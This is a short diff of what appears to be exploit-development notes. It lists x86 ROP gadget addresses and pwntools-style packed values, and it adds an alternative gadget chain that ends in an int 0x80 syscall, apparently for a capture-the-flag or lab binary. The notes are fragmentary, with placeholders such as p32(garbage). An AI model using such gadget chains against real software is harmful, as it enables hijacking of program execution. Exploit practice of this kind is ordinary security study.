@@ -18,3 +18,20 @@ p32(0x804c05d)
 xor_eax_eax = 0x000336af
 0x0016188f : add eax, 7 ; ret
 0x00076ab0 : push eax ; push edx ; push esi ; call ecx
+
+
+
+#alternative with syscall
+xor_eax_eax = 0x000336af
+0x000b3660 : add eax, 3 ; ret
+0x0012778d : mov edx, eax ; mov eax, edx ; ret
+0x000ed9a2 : mov ebx, edx ; ret
+0x00103bf0 : pop ecx ; pop eax ; ret
+p32(0x804c05d)
+p32(garbage)
+xor_eax_eax = 0x000336af
+0x0016188f : add eax, 7 ; ret
+0x0012778d : mov edx, eax ; mov eax, edx ; ret
+0x00031ad8 : mov eax, 1 ; ret
+0xc6c36:       cd 80                   int    $0x80
+
